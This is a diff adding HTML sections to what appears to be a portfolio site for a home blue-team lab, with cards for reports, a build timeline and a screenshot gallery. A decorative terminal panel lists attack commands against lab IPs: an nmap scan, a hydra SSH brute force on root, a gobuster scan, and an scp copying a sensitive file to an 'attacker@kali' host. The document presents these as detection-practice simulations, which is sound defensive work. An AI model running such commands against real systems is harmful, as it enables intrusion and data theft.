+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">investigations/</span><span class="pill">03-powershell-case.md</span></div>
+              <h3>PowerShell Case</h3>
+              <p>Windows script execution style casework that makes the portfolio feel closer to real-world blue-team investigations.</p>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="reports">
+    <div class="container">
+      <div class="section-head">
+        <h2>Reports</h2>
+        <p>This row reflects the reports folder and reinforces that the project is not only about alerts, but about analyst communication and security reporting.</p>
+      </div>
+      <div class="row-wrap">
+        <div class="scroller">
+          <button class="card modal-card" data-title="Weekly SOC Report" data-subtitle="reports/00-weekly-soc-report-template.md" data-description="Reusable reporting structure for top alerts, notable trends, prioritized detections, and actions taken." data-details="shows communication skill|good for managers|easy to adapt to real work|weekly reporting structure" data-labels="reports/,00-weekly-soc-report-template.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">reports/</span><span class="pill">00-weekly-soc-report-template.md</span></div>
+              <h3>Weekly SOC Report</h3>
+              <p>Reusable reporting structure for top alerts, notable trends, prioritized detections, and actions taken.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="Incident Report Template" data-subtitle="reports/01-incident-report-template.md" data-description="Clear structure for evidence, scope, ATT&CK mapping, severity, and recommended next steps." data-details="attach case evidence|add screenshots|summarize impact|ready-to-use incident format" data-labels="reports/,01-incident-report-template.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">reports/</span><span class="pill">01-incident-report-template.md</span></div>
+              <h3>Incident Report Template</h3>
+              <p>Clear structure for evidence, scope, ATT&amp;CK mapping, severity, and recommended next steps.</p>
+            </div>
+          </button>
+          <button class="card modal-card" data-title="MITRE Coverage Matrix" data-subtitle="reports/02-mitre-coverage-matrix.md" data-description="Coverage view linking simulations, detections, and investigations to ATT&CK techniques across the project." data-details="show detection maturity|prove structured thinking|highlight future gaps|coverage by technique" data-labels="reports/,02-mitre-coverage-matrix.md">
+            <div class="card-media"></div>
+            <div class="card-body">
+              <div class="meta"><span class="pill">reports/</span><span class="pill">02-mitre-coverage-matrix.md</span></div>
+              <h3>MITRE Coverage Matrix</h3>
+              <p>Coverage view linking simulations, detections, and investigations to ATT&amp;CK techniques across the project.</p>
+            </div>
+          </button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <div class="container">
+      <div class="highlight-grid">
+        <div class="panel">
+          <h3>Repository Walkthrough Timeline</h3>
+          <div class="timeline">
+            <div class="step">
+              <div class="step-num">1</div>
+              <div><h3>Scope the Lab</h3><p>Start with project scope, lab inventory, and architecture so the lab has a clear enterprise story.</p></div>
+            </div>
+            <div class="step">
+              <div class="step-num">2</div>
+              <div><h3>Build the Infrastructure</h3><p>Deploy Windows Server, Windows client, Ubuntu, Kali, Security Onion, and Wazuh in a repeatable order.</p></div>
+            </div>
+            <div class="step">
+              <div class="step-num">3</div>
+              <div><h3>Implement Detections</h3><p>Add Wazuh rules, Sysmon coverage, and Security Onion hunts that support your selected attack stories.</p></div>
+            </div>
+            <div class="step">
+              <div class="step-num">4</div>
+              <div><h3>Run Simulations and Cases</h3><p>Execute controlled attacks, collect screenshots, investigate alerts, and write incident reports.</p></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="panel">
+          <h3>Terminal Highlights</h3>
+          <p>This panel gives the site the lab-operation feel you wanted and can later be replaced with a real walkthrough video of the repository, attack flow, and alert evidence.</p>
+          <div class="terminal">
+            <div><span class="prompt">$</span> <span class="cmd">nmap -sS -T4 192.168.20.0/24</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">hydra -l root -P rockyou.txt ssh://192.168.20.10</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">gobuster dir -u http://192.168.20.20 -w common.txt</span></div>
+            <div><span class="prompt">$</span> <span class="cmd">scp sensitivefile attacker@kali:/tmp</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="evidence">
+    <div class="container">
+      <div class="section-head">
+        <h2>Evidence Gallery</h2>
+        <p>These placeholders are designed to match your screenshot checklist and execution checklist so the website stays aligned with the rest of the repository.</p>
+      </div>
+      <div class="gallery">
+        <div class="shot">Architecture Diagram</div>
+        <div class="shot">Wazuh Dashboard Overview</div>
+        <div class="shot">Security Onion Alerts</div>
+        <div class="shot">Suricata Nmap Detection</div>
+        <div class="shot">Linux auth.log Brute Force</div>
+        <div class="shot">Windows Event ID 4625</div>
+        <div class="shot">MITRE ATT&amp;CK Mapping</div>
+        <div class="shot">Incident Report Summary</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="modal" id="cardModal" aria-hidden="true">
+    <div class="modal-backdrop" data-close="true"></div>
+    <div class="modal-dialog" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+      <button class="modal-close" id="modalClose" aria-label="Close">×</button>
+      <div class="modal-hero"></div>
+      <div class="modal-content">
+        <div class="modal-meta" id="modalMeta"></div>
+        <h3 id="modalTitle">Card Title</h3>
+        <p class="modal-description" id="modalDescription"></p>
+        <div class="modal-section">
+          <h4>Highlights</h4>
+          <ul id="modalList"></ul>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="container">
+      This version is now customized around your real repository structure: docs, architecture, infrastructure, detections, simulations, investigations, reports, and website content presented as a Netflix-style GitHub Pages experience.
+    </div>
+  </footer>
+</body>
+</html>
